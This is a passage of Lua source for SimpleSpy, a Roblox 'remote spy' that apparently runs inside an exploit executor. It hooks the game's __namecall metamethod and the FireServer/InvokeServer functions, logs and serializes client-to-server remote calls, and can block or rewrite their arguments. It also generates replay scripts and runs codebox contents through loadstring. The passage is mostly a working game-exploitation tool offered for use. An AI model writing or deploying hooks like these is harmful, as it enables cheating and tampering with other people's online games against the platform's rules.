	else
		if remote:IsA(""RemoteEvent"") then
			gen = gen .. v2s(remote) .. "":FireServer()""
		elseif remote:IsA(""RemoteFunction"") then
			gen = gen .. v2s(remote) .. "":InvokeServer()""
		end
	end
	gen = ""-- Script generated by SimpleSpy - credits to exx#9394\n\n"" .. gen
	prevTables = {}
	return gen
end

--- value-to-string: value, string (out), level (indentation), parent table, var name, is from tovar
function v2s(v, l, p, n, vtv, i, pt, path, tables, tI)
	if not tI then
		tI = { 0 }
	else
		tI[1] += 1
	end
	if typeof(v) == ""number"" then
		if v == math.huge then
			return ""math.huge""
		elseif tostring(v):match(""nan"") then
			return ""0/0 --[[NaN]]""
		end
		return tostring(v)
	elseif typeof(v) == ""boolean"" then
		return tostring(v)
	elseif typeof(v) == ""string"" then
		return formatstr(v, l)
	elseif typeof(v) == ""function"" then
		return f2s(v)
	elseif typeof(v) == ""table"" then
		return t2s(v, l, p, n, vtv, i, pt, path, tables, tI)
	elseif typeof(v) == ""Instance"" then
		return i2p(v)
	elseif typeof(v) == ""userdata"" then
		return ""newproxy(true)""
	elseif type(v) == ""userdata"" then
		return u2s(v)
	elseif type(v) == ""vector"" then
		return string.format(""Vector3.new(%s, %s, %s)"", v2s(v.X), v2s(v.Y), v2s(v.Z))
	else
		return ""nil --[["" .. typeof(v) .. ""]]""
	end
end

--- value-to-variable
--- @param t any
function v2v(t)
	topstr = """"
	bottomstr = """"
	getnilrequired = false
	local ret = """"
	local count = 1
	for i, v in pairs(t) do
		if type(i) == ""string"" and i:match(""^[%a_]+[%w_]*$"") then
			ret = ret .. ""local "" .. i .. "" = "" .. v2s(v, nil, nil, i, true) .. ""\n""
		elseif tostring(i):match(""^[%a_]+[%w_]*$"") then
			ret = ret
				.. ""local ""
				.. tostring(i):lower()
				.. ""_""
				.. tostring(count)
				.. "" = ""
				.. v2s(v, nil, nil, tostring(i):lower() .. ""_"" .. tostring(count), true)
				.. ""\n""
		else
			ret = ret
				.. ""local ""
				.. type(v)
				.. ""_""
				.. tostring(count)
				.. "" = ""
				.. v2s(v, nil, nil, type(v) .. ""_"" .. tostring(count), true)
				.. ""\n""
		end
		count = count + 1
	end
	if getnilrequired then
		topstr = ""function getNil(name,class) for _,v in pairs(getnilinstances())do if v.ClassName==class and v.Name==name then return v;end end end\n""
			.. topstr
	end
	if #topstr > 0 then
		ret = topstr .. ""\n"" .. ret
	end
	if #bottomstr > 0 then
		ret = ret .. bottomstr
	end
	return ret
end

--- table-to-string
--- @param t table
--- @param l number
--- @param p table
--- @param n string
--- @param vtv boolean
--- @param i any
--- @param pt table
--- @param path string
--- @param tables table
--- @param tI table
function t2s(t, l, p, n, vtv, i, pt, path, tables, tI)
	local globalIndex = table.find(getgenv(), t) -- checks if table is a global
	if type(globalIndex) == ""string"" then
		return globalIndex
	end
	if not tI then
		tI = { 0 }
	end
	if not path then -- sets path to empty string (so it doesn't have to manually provided every time)
		path = """"
	end
	if not l then -- sets the level to 0 (for indentation) and tables for logging tables it already serialized
		l = 0
		tables = {}
	end
	if not p then -- p is the previous table but doesn't really matter if it's the first
		p = t
	end
	for _, v in pairs(tables) do -- checks if the current table has been serialized before
		if n and rawequal(v, t) then
			bottomstr = bottomstr
				.. ""\n""
				.. tostring(n)
				.. tostring(path)
				.. "" = ""
				.. tostring(n)
				.. tostring(({ v2p(v, p) })[2])
			return ""{} --[[DUPLICATE]]""
		end
	end
	table.insert(tables, t) -- logs table to past tables
	local s = ""{"" -- start of serialization
	local size = 0
	l = l + indent -- set indentation level
	for k, v in pairs(t) do -- iterates over table
		size = size + 1 -- changes size for max limit
		if size > (_G.SimpleSpyMaxTableSize or 1000) then
			s = s
				.. ""\n""
				.. string.rep("" "", l)
				.. ""-- MAXIMUM TABLE SIZE REACHED, CHANGE '_G.SimpleSpyMaxTableSize' TO ADJUST MAXIMUM SIZE ""
			break
		end
		if rawequal(k, t) then -- checks if the table being iterated over is being used as an index within itself (yay, lua)
			bottomstr = bottomstr
				.. ""\n""
				.. tostring(n)
				.. tostring(path)
				.. ""[""
				.. tostring(n)
				.. tostring(path)
				.. ""]""
				.. "" = ""
				.. (
					rawequal(v, k) and tostring(n) .. tostring(path)
					or v2s(v, l, p, n, vtv, k, t, path .. ""["" .. tostring(n) .. tostring(path) .. ""]"", tables)
				)
			size -= 1
			continue
		end
		local currentPath = """" -- initializes the path of 'v' within 't'
		if type(k) == ""string"" and k:match(""^[%a_]+[%w_]*$"") then -- cleanly handles table path generation (for the first half)
			currentPath = ""."" .. k
		else
			currentPath = ""["" .. k2s(k, l, p, n, vtv, k, t, path .. currentPath, tables, tI) .. ""]""
		end
		if size % 100 == 0 then
			scheduleWait()
		end
		-- actually serializes the member of the table
		s = s
			.. ""\n""
			.. string.rep("" "", l)
			.. ""[""
			.. k2s(k, l, p, n, vtv, k, t, path .. currentPath, tables, tI)
			.. ""] = ""
			.. v2s(v, l, p, n, vtv, k, t, path .. currentPath, tables, tI)
			.. "",""
	end
	if #s > 1 then -- removes the last comma because it looks nicer (no way to tell if it's done 'till it's done so...)
		s = s:sub(1, #s - 1)
	end
	if size > 0 then -- cleanly indents the last curly bracket
		s = s .. ""\n"" .. string.rep("" "", l - indent)
	end
	return s .. ""}""
end

--- key-to-string
function k2s(v, ...)
	if keyToString then
		if typeof(v) == ""userdata"" and getrawmetatable(v) then
			return string.format(
				'""<void> (%s)"" --[[Potentially hidden data (tostring in SimpleSpy:HookRemote/GetRemoteFiredSignal at your own risk)]]',
				safetostring(v)
			)
		elseif typeof(v) == ""userdata"" then
			return string.format('""<void> (%s)""', safetostring(v))
		elseif type(v) == ""userdata"" and typeof(v) ~= ""Instance"" then
			return string.format('""<%s> (%s)""', typeof(v), tostring(v))
		elseif type(v) == ""function"" then
			return string.format('""<Function> (%s)""', tostring(v))
		end
	end
	return v2s(v, ...)
end

--- function-to-string
function f2s(f)
	for k, x in pairs(getgenv()) do
		local isgucci, gpath
		if rawequal(x, f) then
			isgucci, gpath = true, """"
		elseif type(x) == ""table"" then
			isgucci, gpath = v2p(f, x)
		end
		if isgucci and type(k) ~= ""function"" then
			if type(k) == ""string"" and k:match(""^[%a_]+[%w_]*$"") then
				return k .. gpath
			else
				return ""getgenv()["" .. v2s(k) .. ""]"" .. gpath
			end
		end
	end
	if funcEnabled and debug.getinfo(f).name:match(""^[%a_]+[%w_]*$"") then
		return ""function()end --[["" .. debug.getinfo(f).name .. ""]]""
	end
	return ""function()end --[["" .. tostring(f) .. ""]]""
end

--- instance-to-path
--- @param i userdata
function i2p(i)
	local player = getplayer(i)
	local parent = i
	local out = """"
	if parent == nil then
		return ""nil""
	elseif player then
		while true do
			if parent and parent == player.Character then
				if player == Players.LocalPlayer then
					return 'game:GetService(""Players"").LocalPlayer.Character' .. out
				else
					return i2p(player) .. "".Character"" .. out
				end
			else
				if parent.Name:match(""[%a_]+[%w+]*"") ~= parent.Name then
					out = "":FindFirstChild("" .. formatstr(parent.Name) .. "")"" .. out
				else
					out = ""."" .. parent.Name .. out
				end
			end
			parent = parent.Parent
		end
	elseif parent ~= game then
		while true do
			if parent and parent.Parent == game then
				local service = game:FindService(parent.ClassName)
				if service then
					if parent.ClassName == ""Workspace"" then
						return ""workspace"" .. out
					else
						return 'game:GetService(""' .. service.ClassName .. '"")' .. out
					end
				else
					if parent.Name:match(""[%a_]+[%w_]*"") then
						return ""game."" .. parent.Name .. out
					else
						return ""game:FindFirstChild("" .. formatstr(parent.Name) .. "")"" .. out
					end
				end
			elseif parent.Parent == nil then
				getnilrequired = true
				return ""getNil("" .. formatstr(parent.Name) .. ', ""' .. parent.ClassName .. '"")' .. out
			elseif parent == Players.LocalPlayer then
				out = "".LocalPlayer"" .. out
			else
				if parent.Name:match(""[%a_]+[%w_]*"") ~= parent.Name then
					out = "":FindFirstChild("" .. formatstr(parent.Name) .. "")"" .. out
				else
					out = ""."" .. parent.Name .. out
				end
			end
			parent = parent.Parent
		end
	else
		return ""game""
	end
end

--- userdata-to-string: userdata
--- @param u userdata
function u2s(u)
	if typeof(u) == ""TweenInfo"" then
		-- TweenInfo
		return ""TweenInfo.new(""
			.. tostring(u.Time)
			.. "", Enum.EasingStyle.""
			.. tostring(u.EasingStyle)
			.. "", Enum.EasingDirection.""
			.. tostring(u.EasingDirection)
			.. "", ""
			.. tostring(u.RepeatCount)
			.. "", ""
			.. tostring(u.Reverses)
			.. "", ""
			.. tostring(u.DelayTime)
			.. "")""
	elseif typeof(u) == ""Ray"" then
		-- Ray
		return ""Ray.new("" .. u2s(u.Origin) .. "", "" .. u2s(u.Direction) .. "")""
	elseif typeof(u) == ""NumberSequence"" then
		-- NumberSequence
		local ret = ""NumberSequence.new(""
		for i, v in pairs(u.KeyPoints) do
			ret = ret .. tostring(v)
			if i < #u.Keypoints then
				ret = ret .. "", ""
			end
		end
		return ret .. "")""
	elseif typeof(u) == ""DockWidgetPluginGuiInfo"" then
		-- DockWidgetPluginGuiInfo
		return ""DockWidgetPluginGuiInfo.new(Enum.InitialDockState"" .. tostring(u) .. "")""
	elseif typeof(u) == ""ColorSequence"" then
		-- ColorSequence
		local ret = ""ColorSequence.new(""
		for i, v in pairs(u.KeyPoints) do
			ret = ret .. ""Color3.new("" .. tostring(v) .. "")""
			if i < #u.Keypoints then
				ret = ret .. "", ""
			end
		end
		return ret .. "")""
	elseif typeof(u) == ""BrickColor"" then
		-- BrickColor
		return ""BrickColor.new("" .. tostring(u.Number) .. "")""
	elseif typeof(u) == ""NumberRange"" then
		-- NumberRange
		return ""NumberRange.new("" .. tostring(u.Min) .. "", "" .. tostring(u.Max) .. "")""
	elseif typeof(u) == ""Region3"" then
		-- Region3
		local center = u.CFrame.Position
		local size = u.CFrame.Size
		local vector1 = center - size / 2
		local vector2 = center + size / 2
		return ""Region3.new("" .. u2s(vector1) .. "", "" .. u2s(vector2) .. "")""
	elseif typeof(u) == ""Faces"" then
		-- Faces
		local faces = {}
		if u.Top then
			table.insert(faces, ""Enum.NormalId.Top"")
		end
		if u.Bottom then
			table.insert(faces, ""Enum.NormalId.Bottom"")
		end
		if u.Left then
			table.insert(faces, ""Enum.NormalId.Left"")
		end
		if u.Right then
			table.insert(faces, ""Enum.NormalId.Right"")
		end
		if u.Back then
			table.insert(faces, ""Enum.NormalId.Back"")
		end
		if u.Front then
			table.insert(faces, ""Enum.NormalId.Front"")
		end
		return ""Faces.new("" .. table.concat(faces, "", "") .. "")""
	elseif typeof(u) == ""EnumItem"" then
		return tostring(u)
	elseif typeof(u) == ""Enums"" then
		return ""Enum""
	elseif typeof(u) == ""Enum"" then
		return ""Enum."" .. tostring(u)
	elseif typeof(u) == ""RBXScriptSignal"" then
		return ""nil --[[RBXScriptSignal]]""
	elseif typeof(u) == ""Vector3"" then
		return string.format(""Vector3.new(%s, %s, %s)"", v2s(u.X), v2s(u.Y), v2s(u.Z))
	elseif typeof(u) == ""CFrame"" then
		local xAngle, yAngle, zAngle = u:ToEulerAnglesXYZ()
		return string.format(
			""CFrame.new(%s, %s, %s) * CFrame.Angles(%s, %s, %s)"",
			v2s(u.X),
			v2s(u.Y),
			v2s(u.Z),
			v2s(xAngle),
			v2s(yAngle),
			v2s(zAngle)
		)
	elseif typeof(u) == ""DockWidgetPluginGuiInfo"" then
		return string.format(
			""DockWidgetPluginGuiInfo(%s, %s, %s, %s, %s, %s, %s)"",
			""Enum.InitialDockState.Right"",
			v2s(u.InitialEnabled),
			v2s(u.InitialEnabledShouldOverrideRestore),
			v2s(u.FloatingXSize),
			v2s(u.FloatingYSize),
			v2s(u.MinWidth),
			v2s(u.MinHeight)
		)
	elseif typeof(u) == ""PathWaypoint"" then
		return string.format(""PathWaypoint.new(%s, %s)"", v2s(u.Position), v2s(u.Action))
	elseif typeof(u) == ""UDim"" then
		return string.format(""UDim.new(%s, %s)"", v2s(u.Scale), v2s(u.Offset))
	elseif typeof(u) == ""UDim2"" then
		return string.format(
			""UDim2.new(%s, %s, %s, %s)"",
			v2s(u.X.Scale),
			v2s(u.X.Offset),
			v2s(u.Y.Scale),
			v2s(u.Y.Offset)
		)
	elseif typeof(u) == ""Rect"" then
		return string.format(""Rect.new(%s, %s)"", v2s(u.Min), v2s(u.Max))
	else
		return string.format(""nil --[[%s]]"", typeof(u))
	end
end

--- Gets the player an instance is descended from
function getplayer(instance)
	for _, v in pairs(Players:GetPlayers()) do
		if v.Character and (instance:IsDescendantOf(v.Character) or instance == v.Character) then
			return v
		end
	end
end

--- value-to-path (in table)
function v2p(x, t, path, prev)
	if not path then
		path = """"
	end
	if not prev then
		prev = {}
	end
	if rawequal(x, t) then
		return true, """"
	end
	for i, v in pairs(t) do
		if rawequal(v, x) then
			if type(i) == ""string"" and i:match(""^[%a_]+[%w_]*$"") then
				return true, (path .. ""."" .. i)
			else
				return true, (path .. ""["" .. v2s(i) .. ""]"")
			end
		end
		if type(v) == ""table"" then
			local duplicate = false
			for _, y in pairs(prev) do
				if rawequal(y, v) then
					duplicate = true
				end
			end
			if not duplicate then
				table.insert(prev, t)
				local found
				found, p = v2p(x, v, path, prev)
				if found then
					if type(i) == ""string"" and i:match(""^[%a_]+[%w_]*$"") then
						return true, ""."" .. i .. p
					else
						return true, ""["" .. v2s(i) .. ""]"" .. p
					end
				end
			end
		end
	end
	return false, """"
end

--- format s: string, byte encrypt (for weird symbols)
function formatstr(s, indentation)
	if not indentation then
		indentation = 0
	end
	local handled, reachedMax = handlespecials(s, indentation)
	return '""'
		.. handled
		.. '""'
		.. (
			reachedMax
				and "" --[[ MAXIMUM STRING SIZE REACHED, CHANGE '_G.SimpleSpyMaxStringSize' TO ADJUST MAXIMUM SIZE ]]""
			or """"
		)
end

--- Adds \'s to the text as a replacement to whitespace chars and other things because string.format can't yayeet
function handlespecials(value, indentation)
	local buildStr = {}
	local i = 1
	local char = string.sub(value, i, i)
	local indentStr
	while char ~= """" do
		if char == '""' then
			buildStr[i] = '\\""'
		elseif char == ""\\"" then
			buildStr[i] = ""\\\\""
		elseif char == ""\n"" then
			buildStr[i] = ""\\n""
		elseif char == ""\t"" then
			buildStr[i] = ""\\t""
		elseif string.byte(char) > 126 or string.byte(char) < 32 then
			buildStr[i] = string.format(""\\%d"", string.byte(char))
		else
			buildStr[i] = char
		end
		i = i + 1
		char = string.sub(value, i, i)
		if i % 200 == 0 then
			indentStr = indentStr or string.rep("" "", indentation + indent)
			table.move({ '""\n', indentStr, '... ""' }, 1, 3, i, buildStr)
			i += 3
		end
	end
	return table.concat(buildStr)
end

-- safe (ish) tostring
function safetostring(v: any)
	if typeof(v) == ""userdata"" or type(v) == ""table"" then
		local mt = getrawmetatable(v)
		local badtostring = mt and rawget(mt, ""__tostring"")
		if mt and badtostring then
			rawset(mt, ""__tostring"", nil)
			local out = tostring(v)
			rawset(mt, ""__tostring"", badtostring)
			return out
		end
	end
	return tostring(v)
end

--- finds script from 'src' from getinfo, returns nil if not found
--- @param src string
function getScriptFromSrc(src)
	local realPath
	local runningTest
	--- @type number
	local s, e
	local match = false
	if src:sub(1, 1) == ""="" then
		realPath = game
		s = 2
	else
		runningTest = src:sub(2, e and e - 1 or -1)
		for _, v in pairs(getnilinstances()) do
			if v.Name == runningTest then
				realPath = v
				break
			end
		end
		s = #runningTest + 1
	end
	if realPath then
		e = src:sub(s, -1):find(""%."")
		local i = 0
		repeat
			i += 1
			if not e then
				runningTest = src:sub(s, -1)
				local test = realPath.FindFirstChild(realPath, runningTest)
				if test then
					realPath = test
				end
				match = true
			else
				runningTest = src:sub(s, e)
				local test = realPath.FindFirstChild(realPath, runningTest)
				local yeOld = e
				if test then
					realPath = test
					s = e + 2
					e = src:sub(e + 2, -1):find(""%."")
					e = e and e + yeOld or e
				else
					e = src:sub(e + 2, -1):find(""%."")
					e = e and e + yeOld or e
				end
			end
		until match or i >= 50
	end
	return realPath
end

--- schedules the provided function (and calls it with any args after)
function schedule(f, ...)
	table.insert(scheduled, { f, ... })
end

--- yields the current thread until the scheduler gives the ok
function scheduleWait()
	local thread = coroutine.running()
	schedule(function()
		coroutine.resume(thread)
	end)
	coroutine.yield()
end

--- the big (well tbh small now) boi task scheduler himself, handles p much anything as quicc as possible
function taskscheduler()
	if not toggle then
		scheduled = {}
		return
	end
	if #scheduled > 1000 then
		table.remove(scheduled, #scheduled)
	end
	if #scheduled > 0 then
		local currentf = scheduled[1]
		table.remove(scheduled, 1)
		if type(currentf) == ""table"" and type(currentf[1]) == ""function"" then
			pcall(unpack(currentf))
		end
	end
end

--- Handles remote logs
function remoteHandler(hookfunction, methodName, remote, args, funcInfo, calling, returnValue)
	local validInstance, validClass = pcall(function()
		return remote:IsA(""RemoteEvent"") or remote:IsA(""RemoteFunction"")
	end)
	if validInstance and validClass then
		local func = funcInfo.func
		if not calling then
			_, calling = pcall(getScriptFromSrc, funcInfo.source)
		end
		coroutine.wrap(function()
			if remoteSignals[remote] then
				remoteSignals[remote]:Fire(args)
			end
		end)()
		if autoblock then
			if excluding[remote] then
				return
			end
			if not history[remote] then
				history[remote] = { badOccurances = 0, lastCall = tick() }
			end
			if tick() - history[remote].lastCall < 1 then
				history[remote].badOccurances += 1
				return
			else
				history[remote].badOccurances = 0
			end
			if history[remote].badOccurances > 3 then
				excluding[remote] = true
				return
			end
			history[remote].lastCall = tick()
		end
		local functionInfoStr
		local src
		if func and islclosure(func) then
			local functionInfo = {}
			functionInfo.info = funcInfo
			pcall(function()
				functionInfo.constants = debug.getconstants(func)
			end)
			pcall(function()
				functionInfoStr = v2v({ functionInfo = functionInfo })
			end)
			pcall(function()
				if type(calling) == ""userdata"" then
					src = calling
				end
			end)
		end
		if methodName:lower() == ""fireserver"" then
			newRemote(
				""event"",
				remote.Name,
				args,
				remote,
				functionInfoStr,
				(blocklist[remote] or blocklist[remote.Name]),
				src
			)
		elseif methodName:lower() == ""invokeserver"" then
			newRemote(
				""function"",
				remote.Name,
				args,
				remote,
				functionInfoStr,
				(blocklist[remote] or blocklist[remote.Name]),
				src,
				returnValue
			)
		end
	end
end

--- Used for hookfunction
function hookRemote(remoteType, remote, ...)
	if typeof(remote) == ""Instance"" then
		local args = { ... }
		local validInstance, remoteName = pcall(function()
			return remote.Name
		end)
		if validInstance and not (blacklist[remote] or blacklist[remoteName]) then
			local funcInfo = {}
			local calling
			if funcEnabled then
				funcInfo = debug.getinfo(4) or funcInfo
				calling = useGetCallingScript and getcallingscript() or nil
			end
			if recordReturnValues and remoteType == ""RemoteFunction"" then
				local thread = coroutine.running()
				local args = { ... }
				task.defer(function()
					local returnValue
					if remoteHooks[remote] then
						args = { remoteHooks[remote](unpack(args)) }
						returnValue = originalFunction(remote, unpack(args))
					else
						returnValue = originalFunction(remote, unpack(args))
					end
					schedule(
						remoteHandler,
						true,
						remoteType == ""RemoteEvent"" and ""fireserver"" or ""invokeserver"",
						remote,
						args,
						funcInfo,
						calling,
						returnValue
					)
					if blocklist[remote] or blocklist[remoteName] then
						coroutine.resume(thread)
					else
						coroutine.resume(thread, unpack(returnValue))
					end
				end)
			else
				schedule(
					remoteHandler,
					true,
					remoteType == ""RemoteEvent"" and ""fireserver"" or ""invokeserver"",
					remote,
					args,
					funcInfo,
					calling
				)
				if blocklist[remote] or blocklist[remoteName] then
					return
				end
			end
		end
	end
	if recordReturnValues and remoteType == ""RemoteFunction"" then
		return coroutine.yield()
	elseif remoteType == ""RemoteEvent"" then
		if remoteHooks[remote] then
			return originalEvent(remote, remoteHooks[remote](...))
		end
		return originalEvent(remote, ...)
	else
		if remoteHooks[remote] then
			return originalFunction(remote, remoteHooks[remote](...))
		end
		return originalFunction(remote, ...)
	end
end

local newnamecall = newcclosure(function(remote, ...)
	if typeof(remote) == ""Instance"" then
		local args = { ... }
		local methodName = getnamecallmethod()
		local validInstance, remoteName = pcall(function()
			return remote.Name
		end)
		if
			validInstance
			and (methodName == ""FireServer"" or methodName == ""fireServer"" or methodName == ""InvokeServer"" or methodName == ""invokeServer"")
			and not (blacklist[remote] or blacklist[remoteName])
		then
			local funcInfo = {}
			local calling
			if funcEnabled then
				funcInfo = debug.getinfo(3) or funcInfo
				calling = useGetCallingScript and getcallingscript() or nil
			end
			if recordReturnValues and (methodName == ""InvokeServer"" or methodName == ""invokeServer"") then
				local namecallThread = coroutine.running()
				local args = { ... }
				task.defer(function()
					local returnValue
					setnamecallmethod(methodName)
					if remoteHooks[remote] then
						args = { remoteHooks[remote](unpack(args)) }
						returnValue = { original(remote, unpack(args)) }
					else
						returnValue = { original(remote, unpack(args)) }
					end
					coroutine.resume(namecallThread, unpack(returnValue))
					coroutine.wrap(function()
						schedule(remoteHandler, false, methodName, remote, args, funcInfo, calling, returnValue)
					end)()
				end)
			else
				coroutine.wrap(function()
					schedule(remoteHandler, false, methodName, remote, args, funcInfo, calling)
				end)()
			end
		end
		if recordReturnValues and (methodName == ""InvokeServer"" or methodName == ""invokeServer"") then
			return coroutine.yield()
		elseif
			validInstance
			and (methodName == ""FireServer"" or methodName == ""fireServer"" or methodName == ""InvokeServer"" or methodName == ""invokeServer"")
			and (blocklist[remote] or blocklist[remoteName])
		then
			return nil
		elseif
			(not recordReturnValues or methodName ~= ""InvokeServer"" or methodName ~= ""invokeServer"")
			and validInstance
			and (methodName == ""FireServer"" or methodName == ""fireServer"" or methodName == ""InvokeServer"" or methodName == ""invokeServer"")
			and remoteHooks[remote]
		then
			return original(remote, remoteHooks[remote](...))
		else
			return original(remote, ...)
		end
	end
	return original(remote, ...)
end, original)

local newFireServer = newcclosure(function(...)
	return hookRemote(""RemoteEvent"", ...)
end, originalEvent)

local newInvokeServer = newcclosure(function(...)
	return hookRemote(""RemoteFunction"", ...)
end, originalFunction)

--- Toggles on and off the remote spy
function toggleSpy()
	if not toggle then
		if hookmetamethod then
			local oldNamecall = hookmetamethod(game, ""__namecall"", newnamecall)
			original = original or function(...)
				return oldNamecall(...)
			end
			_G.OriginalNamecall = original
		else
			gm = gm or getrawmetatable(game)
			original = original or function(...)
				return gm.__namecall(...)
			end
			setreadonly(gm, false)
			if not original then
				warn(""SimpleSpy: namecall method not found!"")
				onToggleButtonClick()
				return
			end
			gm.__namecall = newnamecall
			setreadonly(gm, true)
		end
		originalEvent = hookfunction(remoteEvent.FireServer, newFireServer)
		originalFunction = hookfunction(remoteFunction.InvokeServer, newInvokeServer)
	else
		if hookmetamethod then
			if original then
				hookmetamethod(game, ""__namecall"", original)
			end
		else
			gm = gm or getrawmetatable(game)
			setreadonly(gm, false)
			gm.__namecall = original
			setreadonly(gm, true)
		end
		hookfunction(remoteEvent.FireServer, originalEvent)
		hookfunction(remoteFunction.InvokeServer, originalFunction)
	end
end

--- Toggles between the two remotespy methods (hookfunction currently = disabled)
function toggleSpyMethod()
	toggleSpy()
	toggle = not toggle
end

--- Shuts down the remote spy
function shutdown()
	if schedulerconnect then
		schedulerconnect:Disconnect()
	end
	for _, connection in pairs(connections) do
		coroutine.wrap(function()
			connection:Disconnect()
		end)()
	end
	SimpleSpy2:Destroy()
	hookfunction(remoteEvent.FireServer, originalEvent)
	hookfunction(remoteFunction.InvokeServer, originalFunction)
	if hookmetamethod then
		if original then
			hookmetamethod(game, ""__namecall"", original)
		end
	else
		gm = gm or getrawmetatable(game)
		setreadonly(gm, false)
		gm.__namecall = original
		setreadonly(gm, true)
	end
	_G.SimpleSpyExecuted = false
end

-- main
if not _G.SimpleSpyExecuted then
	local succeeded, err = pcall(function()
		if not RunService:IsClient() then
			error(""SimpleSpy cannot run on the server!"")
		end
		if
			not hookfunction
			or not getrawmetatable
			or getrawmetatable and not getrawmetatable(game).__namecall
			or not setreadonly
		then
			local missing = {}
			if not hookfunction then
				table.insert(missing, ""hookfunction"")
			end
			if not getrawmetatable then
				table.insert(missing, ""getrawmetatable"")
			end
			if getrawmetatable and not getrawmetatable(game).__namecall then
				table.insert(missing, ""getrawmetatable(game).__namecall"")
			end
			if not setreadonly then
				table.insert(missing, ""setreadonly"")
			end
			shutdown()
			error(
				""This environment does not support method hooks!\n(Your exploit is not capable of running SimpleSpy)\nMissing: ""
					.. table.concat(missing, "", "")
			)
		end
		_G.SimpleSpyShutdown = shutdown
		ContentProvider:PreloadAsync({
			""rbxassetid://6065821980"",
			""rbxassetid://6065774948"",
			""rbxassetid://6065821086"",
			""rbxassetid://6065821596"",
			ImageLabel,
			ImageLabel_2,
			ImageLabel_3,
		})
		-- if gethui then funcEnabled = false end
		onToggleButtonClick()
		RemoteTemplate.Parent = nil
		FunctionTemplate.Parent = nil
		codebox = Highlight.new(CodeBox)
		codebox:setRaw("""")
		getgenv().SimpleSpy = SimpleSpy
		getgenv().getNil = function(name, class)
			for _, v in pairs(getnilinstances()) do
				if v.ClassName == class and v.Name == name then
					return v
				end
			end
		end
		TextLabel:GetPropertyChangedSignal(""Text""):Connect(scaleToolTip)
		-- TopBar.InputBegan:Connect(onBarInput)
		MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
		MaximizeButton.MouseButton1Click:Connect(toggleSideTray)
		Simple.MouseButton1Click:Connect(onToggleButtonClick)
		CloseButton.MouseEnter:Connect(onXButtonHover)
		CloseButton.MouseLeave:Connect(onXButtonUnhover)
		Simple.MouseEnter:Connect(onToggleButtonHover)
		Simple.MouseLeave:Connect(onToggleButtonUnhover)
		CloseButton.MouseButton1Click:Connect(shutdown)
		table.insert(connections, UserInputService.InputBegan:Connect(backgroundUserInput))
		connectResize()
		SimpleSpy2.Enabled = true
		coroutine.wrap(function()
			wait(1)
			onToggleButtonUnhover()
		end)()
		schedulerconnect = RunService.Heartbeat:Connect(taskscheduler)
		if syn and syn.protect_gui then
			pcall(syn.protect_gui, SimpleSpy2)
		end
		bringBackOnResize()
		SimpleSpy2.Parent = --[[gethui and gethui() or]]
			CoreGui
		_G.SimpleSpyExecuted = true
		if not Players.LocalPlayer then
			Players:GetPropertyChangedSignal(""LocalPlayer""):Wait()
		end
		Mouse = Players.LocalPlayer:GetMouse()
		oldIcon = Mouse.Icon
		table.insert(connections, Mouse.Move:Connect(mouseMoved))
	end)
	if not succeeded then
		warn(
			""A fatal error has occured, SimpleSpy was unable to launch properly.\nPlease DM this error message to @exx#9394:\n\n""
				.. tostring(err)
		)
		SimpleSpy2:Destroy()
		hookfunction(remoteEvent.FireServer, originalEvent)
		hookfunction(remoteFunction.InvokeServer, originalFunction)
		if hookmetamethod then
			if original then
				hookmetamethod(game, ""__namecall"", original)
			end
		else
			setreadonly(gm, false)
			gm.__namecall = original
			setreadonly(gm, true)
		end
		return
	end
else
	SimpleSpy2:Destroy()
	return
end

----- ADD ONS ----- (easily add or remove additonal functionality to the RemoteSpy!)
--[[
    Some helpful things:
        - add your function in here, and create buttons for them through the 'newButton' function
        - the first argument provided is the TextButton the player clicks to run the function
        - generated scripts are generated when the namecall is initially fired and saved in remoteFrame objects
        - blacklisted remotes will be ignored directly in namecall (less lag)
        - the properties of a 'remoteFrame' object:
            {
                Name: (string) The name of the Remote
                GenScript: (string) The generated script that appears in the codebox (generated when namecall fired)
                Source: (Instance (LocalScript)) The script that fired/invoked the remote
                Remote: (Instance (RemoteEvent) | Instance (RemoteFunction)) The remote that was fired/invoked
                Log: (Instance (TextButton)) The button being used for the remote (same as 'selected.Log')
            }
        - globals list: (contact @exx#9394 for more information or if you have suggestions for more to be added)
            - closed: (boolean) whether or not the GUI is currently minimized
            - logs: (table[remoteFrame]) full of remoteFrame objects (properties listed above)
            - selected: (remoteFrame) the currently selected remoteFrame (properties listed above)
            - blacklist: (string[] | Instance[] (RemoteEvent) | Instance[] (RemoteFunction)) an array of blacklisted names and remotes
            - codebox: (Instance (TextBox)) the textbox that holds all the code- cleared often
]]
-- Copies the contents of the codebox
newButton(""Copy Code"", function()
	return ""Click to copy code""
end, function()
	setclipboard(codebox:getString())
	TextLabel.Text = ""Copied successfully!""
end)

--- Copies the source script (that fired the remote)
newButton(""Copy Remote"", function()
	return ""Click to copy the path of the remote""
end, function()
	if selected then
		setclipboard(v2s(selected.Remote.remote))
		TextLabel.Text = ""Copied!""
	end
end)

-- Executes the contents of the codebox through loadstring
newButton(""Run Code"", function()
	return ""Click to execute code""
end, function()
	local orText = ""Click to execute code""
	TextLabel.Text = ""Executing...""
	local succeeded = pcall(function()
		return loadstring(codebox:getString())()
	end)
	if succeeded then
		TextLabel.Text = ""Executed successfully!""
	else
		TextLabel.Text = ""Execution error!""
	end
end)

--- Gets the calling script (not super reliable but w/e)
newButton(""Get Script"", function()
	return ""Click to copy calling script to clipboard\nWARNING: Not super reliable, nil == could not find""
end, function()
	if selected then
		setclipboard(SimpleSpy:ValueToString(selected.Source))
		TextLabel.Text = ""Done!""
	end
end)

--- Decompiles the script that fired the remote and puts it in the code box
newButton(""Function Info"", function()
	return ""Click to view calling function information""
end, function()
	if selected then
		if selected.Function then
			codebox:setRaw(
				""-- Calling function info\n-- Generated by the SimpleSpy serializer\n\n"" .. tostring(selected.Function)
			)
		end
		TextLabel.Text = ""Done! Function info generated by the SimpleSpy Serializer.""
	end
end)

--- Clears the Remote logs
newButton(""Clr Logs"", function()
	return ""Click to clear logs""
end, function()
	TextLabel.Text = ""Clearing...""
	logs = {}
	for _, v in pairs(LogList:GetChildren()) do
		if not v:IsA(""UIListLayout"") then
			v:Destroy()
		end
	end
	codebox:setRaw("""")
	selected = nil
	TextLabel.Text = ""Logs cleared!""
end)

--- Excludes the selected.Log Remote from the RemoteSpy
newButton(""Exclude (i)"", function()
	return ""Click to exclude this Remote.\nExcluding a remote makes SimpleSpy ignore it, but it will continue to be usable.""
end, function()
	if selected then
		blacklist[selected.Remote.remote] = true
		TextLabel.Text = ""Excluded!""
	end
end)

--- Excludes all Remotes that share the same name as the selected.Log remote from the RemoteSpy
newButton(""Exclude (n)"", function()
